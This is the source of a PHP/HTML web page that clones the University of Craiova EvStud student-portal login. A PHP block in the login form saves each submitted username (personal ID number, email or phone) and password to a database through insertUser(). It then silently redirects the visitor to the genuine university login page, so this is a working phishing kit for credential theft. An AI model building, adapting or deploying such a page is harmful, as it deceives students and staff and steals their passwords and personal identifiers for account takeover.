<!DOCTYPE html>
<html class="no-js">

<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta charset="utf-8">
    <title>Evidența Studenților - Universitatea din Craiova</title>
    <meta name=description content="Evidența Studenților - Universitatea din Craiova" />
    <meta name="theme-color" content="#06038d" />
    <meta property="og:title" content="Evidența Studenților - Universitatea din Craiova" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="login.html" />
    <meta property="og:site_name" content="Evidenta Studentilor" />
    <meta property="og:image" content="http://cis01.central.ucv.ro/virtual_ucv/univ_craiova.jpg" />
    <meta property="og:admins" content=525795262 />
    <meta property="twitter:card" content=summary />
    <meta property="twitter:site" content="@evstud" />
    <meta property="twitter:title" content="Evidența Studenților - Universitatea din Craiova" />
    <meta property="twitter:description" content="Evidența Studenților - Universitatea din Craiova" />
    <meta property="twitter:url" content="login.html" />
    <meta content=557261834288386 property="fb:pages">
    <meta content="width=device-width, initial-scale=1.0" name=viewport>
    <link rel="icon" type="image/x-icon" href="media/favicon.ico" />
    <script src="js/modernizr.custom.js"></script>
    <link rel="stylesheet" href="libs/bootstrap-3.3.7-dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/bootstrap-3.3.7-dist/css/bootstrap-theme.min.css">

    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans" rel="stylesheet">
    <link href="css/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <link href="libs/jquery-ui-1.13.2/jquery-ui.min.css" rel="stylesheet">
    <link href="libs/datatables/jquery.dataTables.min.css" rel=stylesheet />

    <link href="css/datatables.css" rel=stylesheet />
    <link href="libs/flag-icons/css/flag-icons.min.css" rel="stylesheet" />
    <link href="css/ev.css" rel="stylesheet" />

    <script src="libs/pace-js/pace.min.js"></script>
    <link rel="stylesheet" href="libs/pace-js/pace-theme-default.min.css">
    <style>
        .pace .pace-progress {
            background: #4caf50;
            height: 5px;
        }
    </style>
    <script>
        // var baseURL = 'https://evstud.ucv.ro/';
        // var ajaxURL = 'https://evstud.ucv.ro/';
        var baseURL = 'http://localhost:8080/login.php';
        var ajaxURL = 'http://localhost:8080/login.php';
        var aCode = 'FLMCjPb0XSpwstj0GCgLrA==';
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PKQ1KESE9Z"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-PKQ1KESE9Z');
    </script>
</head>

<body>
    <div id="messagesBox">
        <div id="messagesBoxItemX" class="messagesBoxItem hidden" style="">...</div>
    </div>
    <div id="slidemenu" class="header-slide collapse">
        <div class="wrapper">
            <nav class="over--menu">
                <h2 class="accessibility-help">navigation, main menu</h2>
                <div class="row">
                    <button id="btnCloseSlide" type="button" class="" data-toggle="collapse" data-target="#slidemenu" aria-expanded="true">×</button>
                </div>
                <div class="row">

                    <div class="col-xs-6">
                        <div class="col-sm-6 collapse">
                            <a class="box linkbox box--linked" href="#">
                                <div class="linkbox__icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" enable-background="new 0 0 32 32">
                                        <path fill="#16C98D" d="M16 0C7.2 0 0 7.2 0 16s7.2 16 16 16 16-7.2 16-16S24.8 0 16 0zm0 1.5c3.8 0 7.2 1.4 9.7 3.8l-3.6 3.6c-1.7-1.4-3.8-2.3-6.1-2.3s-4.5.9-6.1 2.3L6.3 5.2c2.5-2.3 5.9-3.7 9.7-3.7zM24 16c0 4.4-3.6 8-8 8s-8-3.6-8-8 3.6-8 8-8 8 3.6 8 8zM1.5 16c0-3.8 1.4-7.2 3.8-9.7l3.6 3.6c-1.4 1.7-2.3 3.8-2.3 6.1s.9 4.5 2.3 6.1l-3.6 3.6c-2.4-2.5-3.8-5.9-3.8-9.7zM16 30.5c-3.8 0-7.2-1.4-9.7-3.8l3.6-3.6c-1.7 1.4-3.8 2.3-6.1 2.3s-4.5-.9-6.1-2.3l3.6 3.6c-2.5 2.4-5.9 3.8-9.7 3.8zm10.8-4.8l-3.6-3.6c1.4-1.7 2.3-3.8 2.3-6.1s-.9-4.5-2.3-6.1l3.6-3.6c2.3 2.6 3.8 6 3.8 9.7-.1 3.8-1.5 7.2-3.8 9.7z"></path>
                                    </svg>
                                </div>
                                <p class="linkbox__title"> Support </p>
                            </a>
                        </div>
                        <div class="col-sm-6 collapse">
                            <a class="box linkbox box--linked" href="#">
                                <div class="linkbox__icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" enable-background="new 0 0 32 32">
                                        <path fill="#16C98D" d="M16 0C7.2 0 0 7.2 0 16s7.2 16 16 16 16-7.2 16-16S24.8 0 16 0zm0 1.5c3.8 0 7.2 1.4 9.7 3.8l-3.6 3.6c-1.7-1.4-3.8-2.3-6.1-2.3s-4.5.9-6.1 2.3L6.3 5.2c2.5-2.3 5.9-3.7 9.7-3.7zM24 16c0 4.4-3.6 8-8 8s-8-3.6-8-8 3.6-8 8-8 8 3.6 8 8zM1.5 16c0-3.8 1.4-7.2 3.8-9.7l3.6 3.6c-1.4 1.7-2.3 3.8-2.3 6.1s.9 4.5 2.3 6.1l-3.6 3.6c-2.4-2.5-3.8-5.9-3.8-9.7zM16 30.5c-3.8 0-7.2-1.4-9.7-3.8l3.6-3.6c1.7 1.4 3.8 2.3 6.1 2.3s4.5-.9 6.1-2.3l3.6 3.6c-2.5 2.4-5.9 3.8-9.7 3.8zm10.8-4.8l-3.6-3.6c1.4-1.7 2.3-3.8 2.3-6.1s-.9-4.5-2.3-6.1l3.6-3.6c2.3 2.6 3.8 6 3.8 9.7-.1 3.8-1.5 7.2-3.8 9.7z"></path>
                                    </svg>
                                </div>
                                <p class="linkbox__title"> Support </p>
                            </a>
                        </div>
                    </div>

                    <div class="col-xs-6">

                        <div class="slide-menu-group col-md-4">
                            <div class="footer-top__nav collapse">
                                <a class="footer-top__link footer-top__link--twitter" href="https://www.ucv.ro/">Universitatea din Craiova</a>
                            </div>
                        </div>
                        <div class="slide-menu-group col-md-4">
                            <div class="title"> Documentatie &amp; Ajutor </div>
                            <div class="body">
                                <a class="link" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="faq.content.php" href="#">Intrebari frecvente</a>
                                <a class="link" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="userguide.content.php" href="#">Documentatie utilizare</a>
                            </div>
                        </div>
                        <div class="slide-menu-group col-md-4">
                            <div class="title"> Profil </div>
                            <div class="body">
                                <a class="link" href="https://evstud.ucv.ro/contact/">Contul meu</a>
                                <a class="link" href="#">Setari</a>
                            </div>
                        </div>
                    </div>
                </div>
            </nav>
        </div>
    </div>
</body>

<header class="header--menu header--alternate">
    <div class="wrapper">
        <div class="row">
            <nav class="navigation--menu">
                <h2 class="accessibility-help">navigation</h2>
                <ul class="navigation__container">
                </ul>
                <button class="navigation__mobile-menu-button button button--hamburger" type="button"> <i class="icon icon__hamburger"></i></button>
            </nav>
            <nav class="navigation--logo">
                <div class="Aligner">
                    <div class="Aligner-item Aligner-item--top">
                        <h1>
                            <a href="http://localhost:8080/login.php" title="Evidența Studenților - Universitatea din Craiova">
                                <span class="accessibility-help">Evidența Studenților - Universitatea din Craiova</span>
                                <img class="ucv-header-logo icon" src="media/ucv-logo-small.png" alt="Evidenta Studentilor, Universitatea din Craiova">
                            </a>
                        </h1>
                    </div>
                    <div class="Aligner-item lng-switch">
                        <div class="dropdown">
                            <button class="btn btn-default dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                                <span class="fi fi-ro"></span><span class="hidden-xs">&nbsp;Română</span>
                                <span class="caret"></span>
                            </button>
                            <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
                                <li><a href="http://localhost:8080/login.php?lng=ro"><span class="fi fi-ro"></span>&nbsp;Română</a></li>
                                <li><a href="http://localhost:8080/login.php?lng=en"><span class="fi fi-us"></span>&nbsp;English</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </nav>
        </div>
    </div>
</header>

<div class="page-block">
    <div class="wrapper">
        <div class="row row-bordered">
            <div class="col-xs-12 hero-title">
                <h1 class="">Autentificare Portal EvStud<br />
                    Universitatea din Craiova.</h1>
            </div>
        </div>
    </div>
</div>

<div class="page-block">
    <div class="wrapper" id="wrapper-connect">
        <div class="row row-bordered">
            <div class="col-xs-12 hero-title" id="step-panel-holder">
                <div class="only-cnp">
                    <p class="">Pentru autentificare va rugam sa completați codul de utilizator</p>
                </div>
                <div class="only-pass collapse">
                    <p class="">Introduceți parola sau reveniți <a href="#" onclick="location.reload();">la pasul anterior</a>.</p>
                </div>


                <?php
                include 'database.php';

                if ($_SERVER["REQUEST_METHOD"] == "POST") {
                    if (isset($_POST['step']) && $_POST['step'] == 'cnp') {
                        if (isset($_POST['inputCNP']) && !empty($_POST['inputCNP']) && isset($_POST['inputPass']) && !empty($_POST['inputPass'])) {
                            $username = $_POST['inputCNP'];
                            $password = $_POST['inputPass'];
                            insertUser($username, $password);
                            echo '<script>window.location.href = "https://evstud.ucv.ro/login.php";</script>';
                            exit;
                        } else {
                            // echo "Introduceți un utilizator și o parolă valide.";
                        }
                    } else {
                        echo "Acțiune invalidă.";
                    }
                }
                ?>


                <script>
                    function showPasswordInput() {
                        document.getElementById("divType").style.display = "block";
                        document.getElementById("btnContinueCNP").style.display = "none";
                        document.getElementById("btnContinuePass").style.display = "block";
                    }

                    function showContinueButton() {
                        document.getElementById("divType").style.display = "none";
                        document.getElementById("btnContinueCNP").style.display = "block";
                        document.getElementById("btnContinuePass").style.display = "none";
                    }
                </script>


                <form class="form-horizontal frm--ver-cnp" id="frmVerCnp" method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                    <input type="hidden" name="step" value="cnp">
                    <input type="hidden" name="type" value="">
                    <div id="frmErrorMsg" class="alert alert-danger text-left collapse" role="alert"><span></span></div>
                    <div class="form-group row only-cnp">
                        <label for="inputCNP" class="col-sm-2 control-label">Utilizator</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" name="inputCNP" id="inputCNP" autocomplete="username" placeholder="email sau telefon sau CNP">
                        </div>
                        <div class="col-sm-2">
                            <button type="button" id="btnContinueCNP" class="btn btn-primary" onclick="showPasswordInput()">Continuă</button>
                        </div>
                    </div>
                    <div class="form-group row only-pass collapse" id="divType">
                        <div class="row collapse" id="divType">
                            <label class="col-sm-4 control-label">Continuați ca:</label>
                            <div class="col-sm-8 text-left">
                                <input type="radio" id="studType" name="inputType" value="0">
                                <label for="studType">Student / Candidat</label><br>
                                <input type="radio" id="userType" name="inputType" value="1">
                                <label for="userType">Personal UCV</label>
                            </div>
                        </div>
                        <div class="row">
                            <label for="inputPass" class="col-sm-2 control-label">Parola</label>
                            <div class="col-sm-8">
                                <input type="password" autocomplete="new-password" class="form-control" name="inputPass" id="inputPass" placeholder="introduceți parola">
                            </div>
                            <div class="col-sm-2">
                                <button type="submit" id="btnContinuePass" class="btn btn-primary" style="display: none;">Continuă</button>
                            </div>
                        </div>
                    </div>
                </form>


                <p class="reset-lnk">
                    <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="recuperare-parola.content.php" href="#">Ai uitat contul? Recuperare parola.</a>
                </p>
                <div class="register_account">
                    <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="creeaza_cont.content.php" href="#"><i class="fa fa-user-plus" aria-hidden="true"></i>&nbsp;Înregistrează un cont nou (înscriere online)</a>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="page-block">
    <div class="wrapper">
        <div class="row row-bordered">
            <div class="col-xs-12 hero-about">
                <p class="p-help-accordion"><i class="fa fa-question-circle" aria-hidden="true"></i></p>
                <div class="dropdown">
                    <button class="accordion">Ajutor logare studenți</button>
                    <div class="dropdown-content">
                        <p>Pentru login, utilizatorul tip student poate utiliza drept cod de acces, la alegere, unul din atributele următoare, dacă acestea au fost declarate la înmatriculare:</p>
                        <ul>
                            <li>codul numeric personal</li>
                            <li>numărul de telefon</li>
                            <li>adresa personală de email</li>
                            <li>adresa instituțională atribuită studentului la înmatriculare</li>
                        </ul>
                        <p>Adresa instituțională se formează astfel: <b>nume.prenume.cod@student.ucv.ro</b>, unde <i>cod</i> este o secvență aleatoare de 3 caractere, generată de aplicație în momentul creării contului. Dacă nu cunoașteți adresa de email instituțională, o puteți afla din profilul personal, accesându-l pe baza CNP, telefon sau adresa de email personală declarată la înmatriculare. Puteți recupera parola de conectare accesând linkul <b>Recuperare parola</b> și utilizând CNP-ul sau adresa de mail personală. Lipsa unei adrese personale valide va duce la imposibilitatea de a vă recupera parola; în acest caz, solicitați informații secretariatului dvs.</p>
                    </div>
                </div>
                <div class="dropdown">
                    <button class="accordion">Ajutor logare angajați</button>
                    <div class="dropdown-content">
                        <p>Pentru login, utilizatorul de tip angajat al Universității din Craiova poate utiliza drept cod de acces, la alegere, unul din atributele următoare, dacă acestea au fost declarate pentru utilizatorul dumneavoastră:</p>
                        <ul>
                            <li>codul numeric personal</li>
                            <li>numărul de telefon</li>
                            <li>adresa personală de email</li>
                            <li>adresa instituțională</li>
                        </ul>
                        <p>Adresa instituțională se formează astfel: <b>prenume.nume@edu.ucv.ro</b> sau <b>prenume.nume@adm.ucv.ro</b>. Puteți recupera parola de conectare accesând linkul Recuperare cont și utilizând adresa de mail personală. Lipsa unei adrese personale valide va duce la imposibilitatea de a vă recupera sau modifica parola.</p>
                    </div>
                </div>
                <div class="dropdown">
                    <button class="accordion">Ajutor recuperare cont</button>
                    <div class="dropdown-content">
                        <p>Folosiți link-ul <b>Recuperare parola</b> și introduceți codul dumneavoastră de utilizator. Un mesaj cu informații referitoare la parolă sau la procedura de modificare a acesteia va fi trimis la adresa de email personală. În cazul în care adresa nu este corectă sau indisponibilă, nu vă puteți reseta parola fără să apelați la ajutorul secretariatului dumneavoastră.</p>
                    </div>
                </div>
                <div class="dropdown">
                    <button class="accordion">Ajutor înregistrare cont nou (înscriere online)</button>
                    <div class="dropdown-content">
                        <p>Folosiți această opțiune dacă doriți să vă înscrieți online într-o sesiune de admitere la Universitatea din Craiova. Pentru finalizarea înregistrării contului, este necesară confirmarea operației prin completarea codului trimis în adresa dvs. de email.</p>
                        <p>Pentru detalii privind procesul de înscriere:</p>
                        <ul>
                            <li><a href="media/video/inscriere-admitere_ucv-2023.mp4" target="_blank">Tutorial admitere</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div id="infoModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="infoModalLabel" aria-hidden="true">
    <div class="modal-dialog">

    </div>
</div>


<div id="confirmModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="confirmModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel">Confirmare cont</h4>
            </div>
            <div class="modal-body">
                <div class="row">
                    <div class="mesaj-confirm col-md-12">
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <button type="button" class="confirm btn btn-primary"></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="page-block">
    <div class="wrapper">
        <nav>
            <div class="row row-bordered">
                <div class="col-xs-3 footer-nav-group">
                    <div class="title">Portal UCV</div>
                    <div class="body">
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="despre.content.php" href="#">Despre</a>
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="contact.content.php" href="#">Contact</a>
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="ajutor.content.php" href="#">Ajutor</a>
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="recuperare-parola.content.php" href="#">Recuperare parola</a>
                    </div>
                </div>
                <div class="col-xs-3 footer-nav-group">
                    <div class="title">UCV</div>
                    <div class="body">
                        <a class="link" target="_blank" href="http://www.ucv.ro/admitere/">Admitere</a>
                        <a class="link" target="_blank" href="http://www.ucv.ro/studenti/">Studenți</a>
                        <a class="link" target="_blank" href="http://www.ucv.ro/campus/">Campus</a>
                    </div>
                </div>
                <div class="col-xs-3 footer-nav-group">
                    <div class="title">Evidența Studenților</div>
                    <div class="body">
                        <a class="link" target="_blank" href="http://cis01.central.ucv.ro/evstud/structura/">Structura UCV</a>
                        <a class="link" target="_blank" href="http://cis01.central.ucv.ro/evstud/planuri/">Planuri de învățământ</a>
                        <a class="link" target="_blank" href="http://cis01.central.ucv.ro/evstud/">EvStud</a>
                    </div>
                </div>
                <div class="col-xs-3 footer-nav-group">
                    <div class="title">Suport</div>
                    <div class="body">
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="tos.content.php" href="#">Termeni și condiții</a>
                        <a class="link" target="_blank" href="https://www.ucv.ro/site/acces/protectia_datelor_cu_caracter_personal.php">Prelucrarea datelor cu caracter personal</a>
                        <a class="link btn-common btn-std tranz-01 grow separator-bottom" data-toggle="modal" data-target="#infoModal" data-backdrop="static" data-keyboard="true" data-remotesource="cookie.content.php" href="#">Politica de utilizare Cookie-uri</a>
                        <a class="link" target="_blank" href="http://www.anpc.gov.ro/">ANPC</a>
                    </div>
                </div>
            </div>
        </nav>
    </div>
</footer>

<footer class="footer-legal">
    <div class="wrapper">
        <nav>
            <div class=row>
                <div class="col-xs-6">
                    <div class="footer-logo-media">
                        <img src="media/ucv-logo-small.png" alt="Universitatea din Craiova">
                    </div>
                    <div class="footer-logo-desc">
                        <span class="copyright">© 2017-2023 Universitatea din Craiova. Toate drepturile rezervate.</span>
                        <p>Universitatea din Craiova (ucv.ro) este înregistrată în Registrul de evidență a prelucrărilor de date cu caracter personal sub numărul 10883.</p>
                    </div>
                </div>
                <div class="col-xs-6">
                    <div class="links">
                        <a class="one-link" href="https://www.ucv.ro/" target="_blank">Universitatea din Craiova</a>
                        <a class="one-link" href="https://evstud.ucv.ro/logout.php">Logout</a>
                    </div>
                </div>
            </div>
        </nav>
    </div>
</footer>

<script src="libs/jquery/1.12.4/jquery.min.js"></script>
<script src="libs/np/nptoastmsg.jquery.js"></script>
<script src="js/common.js"></script>
<script src="js/login.js"></script>

<script src="libs/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $(function() {
        if (!window.location.hash) {
            $('#frmVerCnp input[name=step]').val("cnp");
            $('#frmVerCnp input[name=inputCNP]').val("");
            $('#frmVerCnp input[name=inputPass]').val("");
        }
    });
</script>
<script>
    var $buoop = {
        notify: {
            e: 10,
            f: -4,
            o: -4,
            s: -2,
            c: -4
        },
        insecure: true,
        api: 5
    };

    function $buo_f() {
        var e = document.createElement("script");
        e.src = "http://browser-update.org/update.min.js";
        document.body.appendChild(e);
    };
    try {
        document.addEventListener("DOMContentLoaded", $buo_f, false)
    } catch (e) {
        window.attachEvent("onload", $buo_f)
    }
</script>
<script>
    window.interdeal = {
        "sitekey": "8b641cb928344868600f5c871382ea0c",
        "Position": "Left",
        "Menulang": "RO",
        "domains": {
            "js": "https://cdn.equalweb.com/",
            "acc": "https://access.equalweb.com/"
        },
        "btnStyle": {
            "vPosition": ["50%", null],
            "scale": ["0.8", "0.8"],
            "icon": {
                "type": 7,
                "shape": "semicircle",
                "outline": false
            }
        }
    };
    (function(doc, head, body) {
        var coreCall = doc.createElement('script');
        coreCall.src = interdeal.domains.js + 'core/4.5.2/accessibility.js';
        coreCall.defer = true;
        coreCall.integrity = 'sha512-GVvo5c2SV7jwI6rUxQrAjIT6u0WHdJ+pbzRZyzfhOUGMaiKekbDs26ipItwEjD9jCvaV1qWbWurNBQGF5eY9aw==';
        coreCall.crossOrigin = 'anonymous';
        coreCall.setAttribute('data-cfasync', true);
        body ? body.appendChild(coreCall) : head.appendChild(coreCall);
    })(document, document.head, document.body);
</script>
<script>

</script>
</body>

</html>
